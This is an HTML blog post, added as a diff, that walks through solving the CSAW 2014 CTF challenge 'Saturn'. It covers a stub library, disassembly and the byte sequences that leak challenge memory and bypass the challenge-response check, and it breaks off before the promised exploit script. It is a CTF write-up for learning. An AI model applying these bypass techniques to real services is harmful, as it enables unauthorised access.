@@ -1,0 +1,607 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>CSAW 2014: Saturn Walkthrough - The Swappage Playground</title>
+  <meta name="author" content="Swappage">
+
+  
+  <meta name="description" content="Starring Superkojiman as My brain runs assembly code
+Barrebas as The silent disassembler ninja
+Swappage as The mumbler and random guesser Hello hello &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://swappage.github.io/blog/2014/09/24/csaw-2014-saturn-walkthrough">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="The Swappage Playground" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/libs/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="//fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href="//fonts.googleapis.com/css?family=PT+Sans:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+
+  
+
+</head>
+
+<body   >
+  <header role="banner"><hgroup>
+  <h1><a href="/">The Swappage Playground</a></h1>
+  
+    <h2>Because in the end, what does matter is having fun.</h2>
+  
+</hgroup>
+
+</header>
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="https://www.google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:swappage.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Blog</a></li>
+  <li><a href="/blog/archives">Archives</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">CSAW 2014: Saturn Walkthrough</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+<time class='entry-date' datetime='2014-09-24T21:20:47+02:00'><span class='date'><span class='date-month'>Sep</span> <span class='date-day'>24</span><span class='date-suffix'>th</span>, <span class='date-year'>2014</span></span> <span class='time'>9:20 pm</span></time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><h2>Starring</h2>
+
+<ul>
+<li>Superkojiman as <em>My brain runs assembly code</em></li>
+<li>Barrebas as <em>The silent disassembler ninja</em></li>
+<li>Swappage as <em>The mumbler and random guesser</em></li>
+</ul>
+
+
+<p>Hello hello, Swappage here writing on behalf of the whole group that worked on this exploit dev :) please don&rsquo;t kill me as my English is really terrible, although it might also be Koji and Bas&#8217; fault for not reviewing this doc properly before publishing :p</p>
+
+<p>During the past weekend me and a bunch of dudes from <a href="www.vulnhub.com">VulnHub</a> decided to test ourselves and play the CSAW 2014 CTF challenge. Along wight he 300 point Forensics challenge, Saturn at exploitation 400 was one of the more interesting ones to solve. This is our writeup on it.</p>
+
+<!-- more -->
+
+
+<p>the question from the challenge stated:</p>
+
+<p><em>You have stolen the checking program for the CSAW Challenge-Response-Authentication-Protocol system. Unfortunately you forgot to grab the challenge-response keygen algorithm (libchallengeresponse.so). Can you still manage to bypass the secure system and read the flag?</em></p>
+
+<p>So basically our objective was to find a way to bypass the challenge-response handshake authentication process handled by this binary to read the flag; it was also obvious that we were missing a component, which was supposed to handle the task of generating the challenge response, and that we needed to live with it.</p>
+
+<h2>Getting the binary to run</h2>
+
+<p>A quick check against the binary using ldd confirmed that we actually were missing a module which was needed for the application to run; relying simply on static analysis might be <strong>extremely</strong> frustrating and unproductive, so our first step was to make sure we could execute the binary locally to also perform dynamic analysis.
+We came up with the following code snippet that we compiled as shared library:</p>
+
+<p>Here is the .c snipplet</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="cp">#include &lt;stdio.h&gt;</span>
+</span><span class='line'><span class="cp">#include &lt;stdlib.h&gt;</span>
+</span><span class='line'>
+</span><span class='line'><span class="kt">int</span> <span class="nf">fillChallengeResponse</span><span class="p">()</span> <span class="p">{</span>
+</span><span class='line'>  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>and the .h</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="kt">int</span> <span class="nf">fillChallengeResponse</span><span class="p">();</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>They were nothing but a dummy function but it was enough to be able to run the binary without it terminating.</p>
+
+<h2>The application structure</h2>
+
+<p>By doing some static analysis we determined that saturn was made of three main parts:</p>
+
+<ul>
+<li>one responsible for providing the client a challenge</li>
+<li>one responsible for checking the response sent by the client to the server</li>
+<li>and the last one that would print out the flag if the response from the client was correct.</li>
+</ul>
+
+
+<p>The access to these 3 branches was handled by something similar to a case switch, where the layout of the buffer sent by the client was verified for a sequence of commands as follows:</p>
+
+<ul>
+<li>if the first byte was in the range of 0xa0 to 0xaf the execution flow would get into the function responsible for providing the challenge to the client</li>
+<li>if the first byte was in the range of 0xe0 to 0xef the execution flow would get into the function responsible for checking the response</li>
+<li>if the first byte was a 0x80, the execution flow would get into the function responsible for printing the flag to stdout.</li>
+</ul>
+
+
+<p><img class="center" src="/images/2014-09-24/caseswitch.png"></p>
+
+<p>At this point we knew that intended way to interact with the binary was to</p>
+
+<ul>
+<li>send the command sequence to request a challenge</li>
+<li>send the response</li>
+<li>send the command to receive the flag</li>
+</ul>
+
+
+<h2>THe genChallenge() function</h2>
+
+<p>Yes, i named it this way, in fact the binary was stripped, so while debugging using IDA i decided to rename it for making things easier :D
+By the way&hellip;
+The second step was to closely verify how the function responsible for providing the challenge to the client actually worked</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+</pre></td><td class='code'><pre><code class='c-objdump'><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804885</span><span class="n">C</span>                 <span class="n">push</span>    <span class="n">ebp</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804885</span><span class="n">D</span>                 <span class="n">mov</span>     <span class="n">ebp</span><span class="p">,</span> <span class="n">esp</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">0804885F</span>                 <span class="n">push</span>    <span class="n">ebx</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048860</span>                 <span class="n">sub</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">34</span><span class="n">h</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048863</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">arg_0</span><span class="p">]</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048866</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_1C</span><span class="p">],</span> <span class="n">al</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048869</span>                 <span class="n">movzx</span>   <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_1C</span><span class="p">]</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804886</span><span class="n">D</span>                 <span class="n">and</span>     <span class="n">eax</span><span class="p">,</span> <span class="mf">0F</span><span class="n">h</span>          <span class="p">;</span> <span class="o">&lt;=====</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048870</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_11</span><span class="p">],</span> <span class="n">al</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048873</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">off_804A050</span>     <span class="p">;</span> <span class="o">&lt;=====</span>
+</span><span class='line'><span class="p">...</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">B9</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">10</span><span class="n">h</span><span class="p">],</span> <span class="n">ebx</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">BD</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">0</span><span class="n">Ch</span><span class="p">],</span> <span class="n">ecx</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">C1</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="n">edx</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">C5</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="n">eax</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">C9</span>                 <span class="n">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span> <span class="n">offset</span> <span class="n">format</span> <span class="p">;</span> <span class="s">&quot;%c%c%c%c&quot;</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">D0</span>                 <span class="n">call</span>    <span class="n">_printf</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">D5</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="nl">ds</span><span class="p">:</span><span class="n">stdout</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">DA</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">esp</span><span class="p">],</span> <span class="n">eax</span>      <span class="p">;</span> <span class="n">stream</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">DD</span>                 <span class="n">call</span>    <span class="n">_fflush</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488E2</span>                 <span class="n">add</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">34</span><span class="n">h</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488E5</span>                 <span class="n">pop</span>     <span class="n">ebx</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488E6</span>                 <span class="n">pop</span>     <span class="n">ebp</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We figured out that the challenge was read and returned to the client from a memory location controlled by the second digit of the byte, which meant that if we sent \xa0 we received 4 bytes, while if we were sending \xa1 we were receiving 4 other bytes.
+This Part required a lot of testing and analysis by <em>talking</em> also to the real server, in fact we didn&rsquo;t have the library that would generate the challenge/response, and therefore these memory locations were all 0.</p>
+
+<p>After a couple of trial and error, and thanks to superkojiman&rsquo;s smartness, we figured out that we could send a sequence of commands and read up to a total of 32 bytes of memory, by sending \xa0\xa1\xa2&hellip; and so on. (more on this later, as this is really important).</p>
+
+<p>At this point we thought then, that the challenge, wasn&rsquo;t composed of 4 bytes, but probably by 32.</p>
+
+<h2>The checkResponse() function</h2>
+
+<p>The check response function was the one responsible for actually verifying the validity of the response provided by the client.</p>
+
+<p>To access this branch of code the client had to send the proper command, in the range of 0xe0 to 0xef followed by a sequence of 4 bytes representing (part) of the response.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+</pre></td><td class='code'><pre><code class='c-objdump'><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488E8</span>                 <span class="n">push</span>    <span class="n">ebp</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488E9</span>                 <span class="n">mov</span>     <span class="n">ebp</span><span class="p">,</span> <span class="n">esp</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">EB</span>                 <span class="n">sub</span>     <span class="n">esp</span><span class="p">,</span> <span class="mi">28</span><span class="n">h</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">080488</span><span class="n">EE</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">arg_0</span><span class="p">]</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488F</span><span class="mi">1</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_1C</span><span class="p">],</span> <span class="n">al</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488F</span><span class="mi">4</span>                 <span class="n">movzx</span>   <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_1C</span><span class="p">]</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488F</span><span class="mi">8</span>                 <span class="n">and</span>     <span class="n">eax</span><span class="p">,</span> <span class="mf">0F</span><span class="n">h</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488F</span><span class="n">B</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_15</span><span class="p">],</span> <span class="n">al</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">080488F</span><span class="n">E</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">off_804A054</span>      <span class="p">;</span> <span class="o">&lt;==</span> <span class="n">the</span> <span class="n">memory</span> <span class="n">location</span> <span class="n">from</span> <span class="n">which</span> <span class="n">the</span> <span class="n">response</span> <span class="n">is</span> <span class="n">read</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048903</span>                 <span class="n">movzx</span>   <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_15</span><span class="p">]</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048907</span>                 <span class="n">shl</span>     <span class="n">edx</span><span class="p">,</span> <span class="mi">2</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804890</span><span class="n">A</span>                 <span class="n">add</span>     <span class="n">eax</span><span class="p">,</span> <span class="n">edx</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804890</span><span class="n">C</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">eax</span><span class="p">]</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804890</span><span class="n">E</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_10</span><span class="p">],</span> <span class="n">eax</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048911</span>                 <span class="n">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="mi">4</span> <span class="p">;</span> <span class="n">nbytes</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048919</span>                 <span class="n">lea</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">buf</span><span class="p">]</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804891</span><span class="n">C</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">esp</span><span class="o">+</span><span class="mi">4</span><span class="p">],</span> <span class="n">eax</span>    <span class="p">;</span> <span class="n">buf</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048920</span>                 <span class="n">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span> <span class="mi">0</span> <span class="p">;</span> <span class="n">fd</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048927</span>                 <span class="n">call</span>    <span class="n">_read</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804892</span><span class="n">C</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">buf</span><span class="p">]</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mf">0804892F</span>                 <span class="n">mov</span>     <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_C</span><span class="p">],</span> <span class="n">eax</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048932</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_C</span><span class="p">]</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048935</span>                 <span class="n">cmp</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_10</span><span class="p">]</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048938</span>                 <span class="n">jz</span>      <span class="kt">short</span> <span class="n">loc_8048946</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804893</span><span class="n">A</span>                 <span class="n">mov</span>     <span class="n">dword</span> <span class="n">ptr</span> <span class="p">[</span><span class="n">esp</span><span class="p">],</span> <span class="mi">0</span> <span class="p">;</span> <span class="n">status</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048941</span>                 <span class="n">call</span>    <span class="n">_exit</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048946</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048946</span> <span class="nl">loc_8048946</span><span class="p">:</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048946</span>                 <span class="n">movzx</span>   <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_15</span><span class="p">]</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804894</span><span class="n">A</span>                 <span class="n">mov</span>     <span class="nl">ds</span><span class="p">:</span><span class="n">dword_804A0A0</span><span class="p">[</span><span class="n">eax</span><span class="o">*</span><span class="mi">4</span><span class="p">],</span> <span class="mi">1</span>   <span class="p">;</span> <span class="o">&lt;==</span> <span class="k">if</span> <span class="n">bytes</span> <span class="n">are</span> <span class="n">correct</span> <span class="n">this</span> <span class="n">memory</span> <span class="n">location</span> <span class="n">is</span> <span class="n">set</span> <span class="n">to</span> <span class="mi">1</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048955</span>                 <span class="n">leave</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048956</span>                 <span class="n">retn</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Again, we missed the library responsible for generating the challenge response, so everything was 0 to us yet we could figure out that</p>
+
+<ul>
+<li>if the bytes were correct the memory location at address <em>dword_804A0A0[eax</em>4]* was set to 1</li>
+<li>if the bytes were wrong exit() was called instead causing the application to terminate.</li>
+</ul>
+
+
+<p>At this point that was all we knew, as we were still missing an important part of the puzzle, which comes into play when the function that is supposed to finally open and read the flag for us is called.</p>
+
+<h2>A matter of cycling</h2>
+
+<p>We thought we were really close to solving the puzzle, but we were obviously proved wrong.</p>
+
+<p>If we take a look at the graph of the function responsible of opening the flag.txt file and then writing it to stdout, we can notice that there is a funny and evil function which i decided to name Cycles()</p>
+
+<p><img class="center" src="/images/2014-09-24/openfile.png"></p>
+
+<p>Apparantly it looks like that depending on the return value of that function, we would or wouldn&rsquo;t be able to read the flag.</p>
+
+<p>Let&rsquo;s give a quick look at the function</p>
+
+<p><img class="center" src="/images/2014-09-24/cycles.png"></p>
+
+<p>The concept is as simple as this:</p>
+
+<ul>
+<li>the function cycles 8 times using the address pointed by ebp+var_4 as counter</li>
+<li>at first it zeroes out EAX</li>
+<li>then it moves the value from the memory location at address dword_804A0A0[eax*4 into EAX</li>
+<li>and it multiplies EAX by EBP+var_8 (which is always 1)</li>
+<li>at the end of the 8 iterations it returns the value in EAX</li>
+</ul>
+
+
+<p>So, considering that to get to read the flag, the only way to do that was for this function to return 1, that meant that EAX had to be 1 after the 8 cycles ended
+At this point the only way, was to have dword_804A0A0[eax*4 to contain 1.</p>
+
+<p>But wait, where did i see this address before? it looks familiar&hellip;</p>
+
+<p>If we get back to the function that checks the response (the one accessed by sending \xeN) we notice that the memory location is exactly the same</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='c-objdump'><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048946</span>                 <span class="n">movzx</span>   <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_15</span><span class="p">]</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804894</span><span class="n">A</span>                 <span class="n">mov</span>     <span class="nl">ds</span><span class="p">:</span><span class="n">dword_804A0A0</span><span class="p">[</span><span class="n">eax</span><span class="o">*</span><span class="mi">4</span><span class="p">],</span> <span class="mi">1</span>   <span class="p">;</span> <span class="o">&lt;==</span> <span class="k">if</span> <span class="n">bytes</span> <span class="n">are</span> <span class="n">correct</span> <span class="n">this</span> <span class="n">memory</span> <span class="n">location</span> <span class="n">is</span> <span class="n">set</span> <span class="n">to</span> <span class="mi">1</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048955</span>                 <span class="n">leave</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048956</span>                 <span class="n">retn</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='c-objdump'><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048803</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_4</span><span class="p">]</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048806</span>                 <span class="n">mov</span>     <span class="n">eax</span><span class="p">,</span> <span class="nl">ds</span><span class="p">:</span><span class="n">dword_804A0A0</span><span class="p">[</span><span class="n">eax</span><span class="o">*</span><span class="mi">4</span><span class="p">]</span>  <span class="p">;</span> <span class="o">&lt;==</span> <span class="k">if</span> <span class="n">this</span> <span class="n">is</span> <span class="mi">1</span><span class="p">,</span> <span class="n">eax</span> <span class="n">is</span> <span class="mi">1</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">0804880</span><span class="n">D</span>                 <span class="n">mov</span>     <span class="n">edx</span><span class="p">,</span> <span class="p">[</span><span class="n">ebp</span><span class="o">+</span><span class="n">var_8</span><span class="p">]</span>
+</span><span class='line'><span class="p">.</span><span class="nl">text</span><span class="p">:</span><span class="mi">08048810</span>                 <span class="n">imul</span>    <span class="n">eax</span><span class="p">,</span> <span class="n">edx</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In the end, the purpose of this function then, was to perform a further check and see if the <strong>whole</strong> response was correct.. wait, what? the WHOLE? (more on this later)</p>
+
+<h2>How we saw the light at the end of the tunnel</h2>
+
+<p>At this point everything was starting to make sense, but we were missing a point..
+then all of a sudden we began to mumble about those 8 iterations</p>
+
+<p><em>8 iterations.. 8 iterations&hellip; but what if?&hellip;</em></p>
+
+<p>And that&rsquo;s how a simple guessing can lead to the solution, what if we needed to send 8 chunks of 4 bytes and build a whole response?
+we thought, then that bitwise AND would make sense, we were able to get a total of 32 bytes of challenge from the server, maybe it&rsquo;s expecting us to send it 32 bytes, in chunk of 4.</p>
+
+<p>we quickly tried that out by building a buffer that would at first pull 32 bytes of challenge 4 bytes at a time</p>
+
+<pre><code>\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7
+</code></pre>
+
+<p>and then send the response with</p>
+
+<pre><code>"\xe0" + &lt;the four bytes received from \xa0&gt; + "\xe1" + &lt;the 4 bytes received from \xa1&gt;.....*
+</code></pre>
+
+<p>and punched it to the server.. DAMN, no luck, it didn&rsquo;t work!
+yet we were so close..</p>
+
+<p>Then at a certain point, Barrebas, who was sitting silent working on reversing the binary said&hellip;</p>
+
+<p><em>&ldquo;Wait.. the response is checked starting at a memory location that is 32 bytes away from where the challenge is read from&rdquo;</em></p>
+
+<p>We saw the light! :D
+we remembered that we could send commands from \xa0 to \xaf, which probably meant we could read past the 32 bytes of the challenge&hellip; what if we tried to verify with \xe0 the output from \xa8, and all the way onward to \xe7 with \xaf?</p>
+
+<p>That would have probably sent the expected response to the server for each challenge request.. we tried and..
+BAM! we got the flag!</p>
+
+<pre><code># ./updated.py
+CSAW ChallengeResponseAuthenticationProtocol Flag Storage
+
+flag{greetings_to_pure_digital}
+</code></pre>
+
+<p>Here is the script we used as exploit to retrieve the flag from the server</p>
+
